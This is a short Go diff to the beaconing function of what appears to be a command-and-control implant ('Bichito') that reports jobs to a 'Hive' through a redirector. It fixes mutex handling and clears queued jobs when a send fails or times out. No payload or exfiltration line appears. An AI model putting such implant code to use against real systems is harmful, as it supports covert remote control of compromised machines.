@@ -100,13 +100,15 @@ func connectOut() string{
 
 	//Lock shared Slice
 	jobsToProcess.mux.Lock()
-	defer jobsToProcess.mux.Unlock()
-
 	jobsToProcess.Jobs = append(jobsToProcess.Jobs,newJobs...)
+	jobsToProcess.mux.Unlock()
 	
-	jobsToHive.mux.Lock()
-	defer jobsToHive.mux.Unlock()
+	
+	
 
+	//Debug: Jobs to be sent to Hive
+	//fmt.Println("Jobs to be sent to Hive: ")
+	//fmt.Println(jobsToHive.Jobs)
 
 	//Encode Jobs
 	bufRC := new(bytes.Buffer)
@@ -131,14 +133,22 @@ func connectOut() string{
 	select{
 		case <- sendCont:
 		case <- sendErr:
+			//Flush Jobs to avoid Bichito getting stuck in following beaconings
+			jobsToHive.mux.Lock()
+			jobsToHive.Jobs = jobsToHive.Jobs[:0]
+			jobsToHive.mux.Unlock()
 			return retrieveError			
 		case <- sendTimeout.C:
+			//Flush Jobs to avoid Bichito getting stuck in following beaconings
+			jobsToHive.mux.Lock()
+			jobsToHive.Jobs = jobsToHive.Jobs[:0]
+			jobsToHive.mux.Unlock() 
 			return "Send Jobs to Redirector Timeout"		
 	}
 
-
+	jobsToHive.mux.Lock()
 	jobsToHive.Jobs = jobsToHive.Jobs[:0]
-
+	jobsToHive.mux.Unlock()
 
 	return "Success"
 }
